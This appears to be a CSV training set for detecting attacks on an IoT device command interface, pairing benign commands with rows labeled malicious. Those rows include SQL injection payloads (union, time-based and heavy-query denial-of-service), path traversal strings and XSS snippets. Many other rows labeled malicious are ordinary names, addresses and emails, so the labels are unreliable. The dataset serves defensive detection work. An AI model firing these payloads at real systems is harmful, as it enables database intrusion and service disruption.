payload,label,attack_type
"run_cmd, echo ['safe', 'payload', 'normal']",benign,norm
"echo, ['safe']",benign,norm
"run_cmd, echo ['mqtt', 'safe', 'payload', 'device']",benign,norm
"start_temp_report, 120",benign,norm
"start_temp_report, 51",benign,norm
"run_cmd, ADD 937 104",benign,norm
"run_cmd, ADD 197 187",benign,norm
"run_cmd, ADD 280 585",benign,norm
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",malicious,cmd_parse_error
"run_cmd, echo ['hello']",benign,norm
"run_cmd, echo ['esp32', 'hello']",benign,norm
"run_cmd, ADD 939 615",benign,norm
"1"") order by 1#",malicious,cmd_parse_error
"echo, ['normal', 'payload']",benign,norm
calle escalona s/n,malicious,cmd_parse_error
c.0c4r1,malicious,cmd_parse_error
"run_cmd, ADD 341 273",benign,norm
"run_cmd, ADD 176 848",benign,norm
wun,malicious,cmd_parse_error
"start_temp_report, 69",benign,norm
"start_temp_report, 30",benign,norm
"run_cmd, ADD 753 762",benign,norm
"run_cmd, echo ['hello', 'system', 'device']",benign,norm
"start_temp_report, 66",benign,norm
promanar,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
"run_cmd, ADD 183 42",benign,norm
-7971' union all select 4273#,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'world']",benign,norm
"echo, ['safe', 'esp32', 'mqtt', 'data']",benign,norm
"start_temp_report, 49",benign,norm
16851,malicious,cmd_parse_error
-6222)) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((3230=3230,malicious,cmdi
"run_cmd, ADD 314 707",benign,norm
"run_cmd, ADD 192 610",benign,norm
dnica,malicious,cmd_parse_error
"run_cmd, echo ['system', 'hello']",benign,norm
"echo, ['data']",benign,norm
rull,malicious,cmd_parse_error
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",malicious,cmd_parse_error
gere.pratsch-kaufmann@rubirubi.sj,malicious,cmd_parse_error
1'||(select 'gnil' from dual where 7552=7552 rlike (select (case when (7689=7689) then 1 else 0x28 end)))||',malicious,cmdi
nhat,malicious,cmd_parse_error
"echo, ['safe', 'ready', 'ok']",benign,norm
bronny,malicious,cmd_parse_error
/.//././/././/././/././/./{file},malicious,cmd_parse_error
"1"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""xsfg"" like ""xsfg",malicious,cmdi
wakao@sitienesunawebtienesunnegocio.as,malicious,cmd_parse_error
"start_temp_report, 22",benign,norm
"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
"start_temp_report, 58",benign,norm
-5569') as cjaf where 3753=3753 union all select 3753#,malicious,cmd_parse_error
"1',(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",malicious,cmdi
"start_temp_report, 34",benign,norm
"run_cmd, ADD 732 37",benign,norm
"run_cmd, echo ['sensor', 'hello']",benign,norm
"run_cmd, echo ['ping', 'sensor', 'mqtt']",benign,norm
"pl. santa isabel s/n, 8-d",malicious,cmd_parse_error
enz4riz7r,malicious,cmd_parse_error
"start_temp_report, 30",benign,norm
9553145655570533,malicious,cmd_parse_error
"echo, ['iot', 'esp32']",benign,norm
"run_cmd, echo ['sensor', 'data', 'safe']",benign,norm
"run_cmd, ADD 57 198",benign,norm
"start_temp_report, 8",benign,norm
prdica,malicious,cmd_parse_error
22193,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'system']",benign,norm
masters-mcnear@costablancarental.ax,malicious,cmd_parse_error
t31331,malicious,cmd_parse_error
1)) as sipp where 1999=1999 and (select * from (select(sleep(5)))fzno)--,malicious,cmd_parse_error
"run_cmd, ADD 842 210",benign,norm
"run_cmd, echo ['mqtt', 'ok']",benign,norm
brutez,malicious,cmd_parse_error
"start_temp_report, 102",benign,norm
"moreno lopez, 55, 9-e",malicious,cmd_parse_error
fonolla calera,malicious,cmd_parse_error
"echo, ['system', 'data']",benign,norm
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",malicious,cmd_parse_error
"-2033"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,cmd_parse_error
begues,malicious,cmd_parse_error
"start_temp_report, 108",benign,norm
"-3411'))) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",malicious,cmd_parse_error
4183,malicious,cmd_parse_error
1') where 6624=6624 and 5392=8258,malicious,cmd_parse_error
"run_cmd, echo ['report', 'esp32']",benign,norm
"start_temp_report, 50",benign,norm
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,cmd_parse_error
"echo, ['hello', 'system']",benign,norm
"echo, ['normal', 'ok']",benign,norm
80029600l,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
04742,malicious,cmd_parse_error
"run_cmd, echo ['sensor']",benign,norm
maria-terzon@lingotes.com.org,malicious,cmd_parse_error
"run_cmd, ADD 563 546",benign,norm
"run_cmd, ADD 826 422",benign,norm
"run_cmd, ADD 287 842",benign,norm
"1"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"echo, ['ready', 'esp32', 'world']",benign,norm
"run_cmd, ADD 482 303",benign,norm
"start_temp_report, 51",benign,norm
lareine2,malicious,cmd_parse_error
sogorb ipamo,malicious,cmd_parse_error
calle la fuente 116 2?e,malicious,cmd_parse_error
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""uquh""=""uquh",malicious,cmd_parse_error
"run_cmd, ADD 243 928",benign,norm
rofes,malicious,cmd_parse_error
zubicueta vallb,malicious,cmd_parse_error
"echo, ['status', 'esp32']",benign,norm
50212,malicious,cmd_parse_error
55842507w,malicious,cmd_parse_error
09620,malicious,cmd_parse_error
"echo, ['system']",benign,norm
"run_cmd, echo ['payload', 'sensor']",benign,norm
"start_temp_report, 65",benign,norm
"run_cmd, echo ['ready']",benign,norm
"run_cmd, echo ['mqtt', 'data', 'normal', 'ping']",benign,norm
"run_cmd, echo ['status', 'hello', 'device', 'iot']",benign,norm
"start_temp_report, 39",benign,norm
"run_cmd, echo ['iot']",benign,norm
"run_cmd, ADD 270 40",benign,norm
tse,malicious,cmd_parse_error
"run_cmd, echo ['data', 'ping']",benign,norm
"start_temp_report, 64",benign,norm
"start_temp_report, 118",benign,norm
"echo, ['safe', 'world', 'hello']",benign,norm
"start_temp_report, 88",benign,norm
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""ewsr"" like ""ewsr",malicious,cmdi
"1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
werkmeister@19horas.zr,malicious,cmd_parse_error
"run_cmd, echo ['system', 'normal', 'sensor']",benign,norm
"run_cmd, echo ['iot', 'ok', 'esp32', 'hello']",benign,norm
"start_temp_report, 8",benign,norm
"run_cmd, ADD 105 936",benign,norm
"run_cmd, echo ['payload', 'iot']",benign,norm
castell sargatal,malicious,cmd_parse_error
leth8,malicious,cmd_parse_error
"echo, ['safe']",benign,norm
84740483l,malicious,cmd_parse_error
mio de san esteban,malicious,cmd_parse_error
02100,malicious,cmd_parse_error
"echo, ['hello', 'esp32']",benign,norm
"run_cmd, echo ['device', 'ready']",benign,norm
f399ici0,malicious,cmd_parse_error
"run_cmd, echo ['system', 'esp32', 'world', 'ping']",benign,norm
"start_temp_report, 66",benign,norm
"echo, ['sensor']",benign,norm
"start_temp_report, 30",benign,norm
"run_cmd, ADD 541 758",benign,norm
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,malicious,cmd_parse_error
"echo, ['hello']",benign,norm
29887757q,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
huic!h9,malicious,cmd_parse_error
rayner,malicious,cmd_parse_error
"run_cmd, echo ['payload']",benign,norm
"1') where 4729=4729;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""lsca"" like ""lsca",malicious,cmdi
"run_cmd, echo ['world']",benign,norm
"start_temp_report, 22",benign,norm
"echo, ['esp32', 'system', 'ok', 'report']",benign,norm
"echo, ['data', 'world', 'mqtt']",benign,norm
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",malicious,cmdi
"calle ingeniero antonio carbonell, 114, 5d",malicious,cmd_parse_error
asander1@nutrimama.do,malicious,cmd_parse_error
"run_cmd, ADD 654 170",benign,norm
"run_cmd, ADD 259 852",benign,norm
79332858q,malicious,cmd_parse_error
64sfa4imiento,malicious,cmd_parse_error
"run_cmd, ADD 188 107",benign,norm
-8911%' or 9323=9323#,malicious,cmd_parse_error
"run_cmd, ADD 788 821",benign,norm
brazzi@cortell.gs,malicious,cmd_parse_error
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",malicious,cmdi
"echo, ['safe', 'normal']",benign,norm
"run_cmd, ADD 47 8",benign,norm
"c/ montereria, 146 4d",malicious,cmd_parse_error
8173502713249650,malicious,cmd_parse_error
ruttmann@quadernideilgarda.dz,malicious,cmd_parse_error
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""%""=""",malicious,cmdi
"1')) as anaq where 9605=9605 and elt(4249=4249,7259)--",malicious,cmd_parse_error
"start_temp_report, 72",benign,norm
peaflor,malicious,cmd_parse_error
trombn,malicious,cmd_parse_error
"start_temp_report, 87",benign,norm
"start_temp_report, 103",benign,norm
13591,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'normal', 'report', 'safe']",benign,norm
"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
81887613t,malicious,cmd_parse_error
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((8535=8535",malicious,cmdi
"run_cmd, echo ['device', 'sensor']",benign,norm
"-3525"" where 3522=3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",malicious,cmd_parse_error
"start_temp_report, 103",benign,norm
"infantes de carrion, 122",malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"start_temp_report, 24",benign,norm
"start_temp_report, 91",benign,norm
"echo, ['payload']",benign,norm
bartolom,malicious,cmd_parse_error
8761060371713838,malicious,cmd_parse_error
"run_cmd, ADD 323 678",benign,norm
"run_cmd, ADD 190 802",benign,norm
"1%')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
assassn clrici,malicious,cmd_parse_error
"run_cmd, ADD 778 590",benign,norm
chuang,malicious,cmd_parse_error
10421521z,malicious,cmd_parse_error
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
torres de la alameda,malicious,cmd_parse_error
"echo, ['ping', 'payload', 'data', 'status']",benign,norm
"run_cmd, echo ['iot', 'status', 'mqtt']",benign,norm
29491,malicious,cmd_parse_error
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",malicious,cmd_parse_error
03500,malicious,cmd_parse_error
"1%' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",malicious,cmd_parse_error
"start_temp_report, 16",benign,norm
"run_cmd, ADD 757 410",benign,norm
3636105969407891,malicious,cmd_parse_error
"run_cmd, ADD 341 704",benign,norm
"echo, ['sensor']",benign,norm
shalom,malicious,cmd_parse_error
"start_temp_report, 47",benign,norm
9068716333740358,malicious,cmd_parse_error
cullie,malicious,cmd_parse_error
"echo, ['world', 'esp32', 'normal', 'payload']",benign,norm
08775,malicious,cmd_parse_error
knight_freihart@tresbrujas.qa,malicious,cmd_parse_error
mostazal,malicious,cmd_parse_error
"echo, ['esp32', 'hello']",benign,norm
"calle manuel de falla, 65 5?a",malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
"run_cmd, echo ['device', 'status', 'ping']",benign,norm
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('efwq' like 'efwq",malicious,cmd_parse_error
nicarda,malicious,cmd_parse_error
"echo, ['ping', 'esp32', 'iot']",benign,norm
-7565') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('gymz'='gymz,malicious,cmdi
"run_cmd, ADD 845 370",benign,norm
dionisio,malicious,cmd_parse_error
"run_cmd, echo ['ready']",benign,norm
"echo, ['sensor', 'esp32', 'payload', 'device']",benign,norm
"run_cmd, echo ['normal']",benign,norm
"start_temp_report, 79",benign,norm
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",malicious,cmdi
"1%""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""%""=""",malicious,cmd_parse_error
"run_cmd, ADD 942 851",benign,norm
"run_cmd, ADD 191 254",benign,norm
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'psdl' like 'psdl,malicious,cmd_parse_error
borrajo,malicious,cmd_parse_error
palmer manzano,malicious,cmd_parse_error
"1'+(select 'mxlb' where 4900=4900;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",malicious,cmdi
"vdola, la",malicious,cmd_parse_error
"1',(select (case when (5586=6403) then 1 else 5586*(select 5586 from mysql.db) end))",malicious,cmd_parse_error
"1));select count(*) from generate_series(1,5000000)--",malicious,cmdi
"start_temp_report, 17",benign,norm
1972,malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
xavier,malicious,cmd_parse_error
"start_temp_report, 80",benign,norm
-2364' or 6743=7578,malicious,cmd_parse_error
79856305y,malicious,cmd_parse_error
"""><script>alert('xssya')</script>",malicious,xss
"run_cmd, echo ['normal']",benign,norm
"echo, ['safe', 'payload', 'hello']",benign,norm
"run_cmd, ADD 960 552",benign,norm
"run_cmd, ADD 801 774",benign,norm
/./.././.././.././.././../{file},malicious,cmd_parse_error
"run_cmd, ADD 261 38",benign,norm
"run_cmd, ADD 671 143",benign,norm
"run_cmd, ADD 816 528",benign,norm
lowietje,malicious,cmd_parse_error
0923146348088975,malicious,cmd_parse_error
"run_cmd, ADD 729 350",benign,norm
"run_cmd, ADD 332 76",benign,norm
"echo, ['normal']",benign,norm
venfica,malicious,cmd_parse_error
"run_cmd, ADD 555 29",benign,norm
1738,malicious,cmd_parse_error
macgregor_poomjai@a2hotels.bj,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'hello', 'payload']",benign,norm
"run_cmd, echo ['hello', 'system', 'mqtt']",benign,norm
"echo, ['hello', 'device', 'system']",benign,norm
"echo, ['payload', 'data', 'safe', 'system']",benign,norm
"run_cmd, echo ['safe', 'payload', 'status', 'mqtt']",benign,norm
"echo, ['ping', 'ready', 'sensor']",benign,norm
"run_cmd, echo ['world', 'payload', 'device', 'sensor']",benign,norm
"1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""",malicious,cmd_parse_error
"run_cmd, echo ['mqtt']",benign,norm
"echo, ['sensor', 'normal', 'iot']",benign,norm
5323,malicious,cmd_parse_error
estanislao,malicious,cmd_parse_error
"echo, ['sensor', 'hello', 'ready']",benign,norm
"start_temp_report, 27",benign,norm
waldemar,malicious,cmd_parse_error
baos de ebro/maueta,malicious,cmd_parse_error
"calle andres mellado, 83, 12-d",malicious,cmd_parse_error
16667079z,malicious,cmd_parse_error
13270,malicious,cmd_parse_error
daniza,malicious,cmd_parse_error
torre alhquime,malicious,cmd_parse_error
"start_temp_report, 28",benign,norm
"start_temp_report, 90",benign,norm
"start_temp_report, 29",benign,norm
"echo, ['mqtt', 'ping']",benign,norm
"run_cmd, ADD 417 222",benign,norm
"run_cmd, echo ['ok', 'status', 'normal']",benign,norm
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112",malicious,cmd_parse_error
"1'||(select 'fraa' from dual where 9140=9140 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",malicious,cmdi
"1%'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'ready', 'status']",benign,norm
2420,malicious,cmd_parse_error
"run_cmd, echo ['ping']",benign,norm
"1"");select benchmark(5000000,md5(0x4c4d6142)) and (""hgds"" like ""hgds",malicious,cmdi
"echo, ['safe', 'report']",benign,norm
"echo, ['report', 'hello', 'ready']",benign,norm
avenida patrimonio de la humanidad 64 13-a,malicious,cmd_parse_error
"run_cmd, ADD 83 770",benign,norm
"echo, ['world', 'device', 'ping', 'mqtt']",benign,norm
"run_cmd, echo ['report', 'ok', 'payload']",benign,norm
calle de joan miro s/n,malicious,cmd_parse_error
"run_cmd, ADD 270 342",benign,norm
"run_cmd, echo ['ready', 'payload', 'normal', 'esp32']",benign,norm
fabrizzio,malicious,cmd_parse_error
"run_cmd, echo ['world', 'payload', 'ok', 'ping']",benign,norm
"run_cmd, echo ['mqtt', 'safe', 'ping', 'iot']",benign,norm
"echo, ['payload']",benign,norm
"1%""))) and 8438=7620--",malicious,cmd_parse_error
"1' where 7445=7445 union all select null,null,null,null,null,null--",malicious,cmd_parse_error
"-2743 union all select 6757,6757,6757,6757,6757,6757--",malicious,cmd_parse_error
"carretera barajas, 147,",malicious,cmd_parse_error
"echo, ['ready', 'iot', 'mqtt']",benign,norm
ralina,malicious,cmd_parse_error
homobono valds,malicious,cmd_parse_error
"-1550' in boolean mode) union all select 9777,9777,9777--",malicious,cmd_parse_error
"start_temp_report, 70",benign,norm
"run_cmd, echo ['data', 'mqtt']",benign,norm
bettiana,malicious,cmd_parse_error
autoritariamente,malicious,cmd_parse_error
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841",malicious,cmd_parse_error
malditamente,malicious,cmd_parse_error
"-1<body onload=""document.cookie=true;"">",malicious,cmdi
elnore,malicious,cmd_parse_error
2955362833372766,malicious,cmd_parse_error
-4557 or 6872=6872-- kkte,malicious,cmd_parse_error
"run_cmd, echo ['ok']",benign,norm
"c/ de la radio 81, 7?b",malicious,cmd_parse_error
"run_cmd, ADD 906 305",benign,norm
"run_cmd, echo ['payload', 'hello']",benign,norm
convento de las dueas 86,malicious,cmd_parse_error
josefa,malicious,cmd_parse_error
"1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
"1)) as bsvo where 3605=3605;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,cmdi
elliott,malicious,cmd_parse_error
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",malicious,cmd_parse_error
"calle pintor juan ismael, 73,",malicious,cmd_parse_error
"1) where 4866=4866;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,cmdi
"run_cmd, ADD 874 316",benign,norm
andrade escriba,malicious,cmd_parse_error
"-1823 where 6852=6852 union all select 6852,6852,6852,6852,6852,6852#",malicious,cmd_parse_error
"castellar, el",malicious,cmd_parse_error
"1') as hats where 2011=2011 union all select null,null,null,null,null#",malicious,cmd_parse_error
suzane,malicious,cmd_parse_error
7o14c0o,malicious,cmd_parse_error
"-4972')) as kfzc where 8817=8817 union all select 8817,8817,8817,8817,8817,8817--",malicious,cmd_parse_error
"start_temp_report, 93",benign,norm
"run_cmd, ADD 266 420",benign,norm
"run_cmd, ADD 823 431",benign,norm
"run_cmd, ADD 157 911",benign,norm
mckee,malicious,cmd_parse_error
chatri1,malicious,cmd_parse_error
hasan,malicious,cmd_parse_error
"echo, ['data', 'report']",benign,norm
-5211 union all select 1754--,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"1) as ocut where 6800=6800 and elt(4249=4249,7259)--",malicious,cmd_parse_error
"1"" where 8978=8978 union all select null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
levitin,malicious,cmd_parse_error
torreblacos,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'payload', 'normal', 'report']",benign,norm
"start_temp_report, 34",benign,norm
"calle juan sitges 24,",malicious,cmd_parse_error
casabermeja,malicious,cmd_parse_error
santoyo@deportechino.edu,malicious,cmd_parse_error
"echo, ['world', 'payload', 'safe']",benign,norm
"1"")) as ogzn where 6849=6849 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
"start_temp_report, 119",benign,norm
"start_temp_report, 107",benign,norm
"start_temp_report, 37",benign,norm
"start_temp_report, 71",benign,norm
"run_cmd, echo ['world']",benign,norm
"-6381%"" or 8571=8571--",malicious,cmd_parse_error
"c/ costa verde, 100 4c",malicious,cmd_parse_error
"run_cmd, echo ['report']",benign,norm
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",malicious,cmdi
"-4025"" or 3038=3038",malicious,cmd_parse_error
"run_cmd, ADD 133 549",benign,norm
"run_cmd, ADD 314 96",benign,norm
"run_cmd, echo ['data', 'ping', 'world']",benign,norm
"start_temp_report, 108",benign,norm
roedel,malicious,cmd_parse_error
"run_cmd, echo ['hello', 'normal', 'device', 'ok']",benign,norm
"1"") where 2016=2016 and (1547=2093)*2093--",malicious,cmd_parse_error
"run_cmd, ADD 767 77",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"run_cmd, ADD 30 400",benign,norm
edilio,malicious,cmd_parse_error
"echo, ['normal', 'sensor']",benign,norm
5335,malicious,cmd_parse_error
insertar,malicious,cmd_parse_error
"start_temp_report, 7",benign,norm
"run_cmd, echo ['iot']",benign,norm
"start_temp_report, 70",benign,norm
alimena,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"run_cmd, echo ['sensor']",benign,norm
"echo, ['hello', 'status', 'esp32', 'iot']",benign,norm
"run_cmd, ADD 934 49",benign,norm
-3862') or 9323=9323#,malicious,cmd_parse_error
"run_cmd, echo ['status', 'iot', 'report', 'mqtt']",benign,norm
"c/ fernan gonzalez, 45 13-b",malicious,cmd_parse_error
3317651896955813,malicious,cmd_parse_error
tait@ibizasounds.ir,malicious,cmd_parse_error
"start_temp_report, 14",benign,norm
"run_cmd, echo ['data', 'sensor']",benign,norm
"run_cmd, echo ['payload']",benign,norm
65898171c,malicious,cmd_parse_error
porfidio,malicious,cmd_parse_error
kripan,malicious,cmd_parse_error
"run_cmd, echo ['system', 'safe', 'iot', 'sensor']",benign,norm
trikonis_ruschel@beatrizbalado.zw,malicious,cmd_parse_error
"start_temp_report, 11",benign,norm
l-9rn,malicious,cmd_parse_error
"-6514)) as pbgg where 6841=6841 union all select 6841,6841,6841,6841--",malicious,cmd_parse_error
5ictoriosamente,malicious,cmd_parse_error
osada,malicious,cmd_parse_error
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",malicious,cmd_parse_error
"start_temp_report, 53",benign,norm
"start_temp_report, 90",benign,norm
"run_cmd, ADD 987 749",benign,norm
"1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
sibila,malicious,cmd_parse_error
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('yaim'='yaim,malicious,cmdi
-5982' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ikuh'='ikuh,malicious,cmdi
5012,malicious,cmd_parse_error
3151,malicious,cmd_parse_error
"run_cmd, ADD 677 106",benign,norm
fedro,malicious,cmd_parse_error
"-8544%"" or 6872=6872 and ""%""=""",malicious,cmd_parse_error
"echo, ['esp32']",benign,norm
"echo, ['device']",benign,norm
"run_cmd, echo ['safe']",benign,norm
"run_cmd, echo ['sensor', 'hello', 'normal', 'data']",benign,norm
"run_cmd, ADD 310 919",benign,norm
"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",malicious,cmdi
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"run_cmd, echo ['hello', 'iot']",benign,norm
"echo, ['ping']",benign,norm
"run_cmd, ADD 880 303",benign,norm
"run_cmd, echo ['iot', 'hello', 'esp32', 'ready']",benign,norm
chang-kang@juegois.sh,malicious,cmd_parse_error
"echo, ['device', 'world']",benign,norm
"run_cmd, echo ['data', 'ping', 'mqtt', 'esp32']",benign,norm
"echo, ['payload', 'status', 'sensor']",benign,norm
"run_cmd, ADD 369 916",benign,norm
"echo, ['system', 'device']",benign,norm
bettine,malicious,cmd_parse_error
/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{file},malicious,cmd_parse_error
"run_cmd, ADD 329 554",benign,norm
"run_cmd, ADD 335 374",benign,norm
intuitivo,malicious,cmd_parse_error
braiam,malicious,cmd_parse_error
"-9361"")) union all select 3112#",malicious,cmd_parse_error
viana de duero,malicious,cmd_parse_error
"start_temp_report, 77",benign,norm
segura reygadas,malicious,cmd_parse_error
tr2cad4,malicious,cmd_parse_error
"run_cmd, ADD 66 863",benign,norm
"run_cmd, ADD 210 882",benign,norm
"echo, ['ping', 'data', 'sensor']",benign,norm
"san roke, 155 13?h",malicious,cmd_parse_error
"echo, ['safe']",benign,norm
"echo, ['report', 'iot', 'device', 'status']",benign,norm
"start_temp_report, 79",benign,norm
grubel8@albeiteria.kw,malicious,cmd_parse_error
bru_na,malicious,cmd_parse_error
"echo, ['safe', 'esp32', 'hello']",benign,norm
"start_temp_report, 83",benign,norm
velichcanich pairot,malicious,cmd_parse_error
"echo, ['mqtt', 'normal', 'system']",benign,norm
"jose maria mortes lerma, 151 11-d",malicious,cmd_parse_error
ying-chieh0@etnics.mn,malicious,cmd_parse_error
"isabel la catolica, 5",malicious,cmd_parse_error
"echo, ['world', 'ready']",benign,norm
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",malicious,cmd_parse_error
"run_cmd, ADD 97 734",benign,norm
llers marquile,malicious,cmd_parse_error
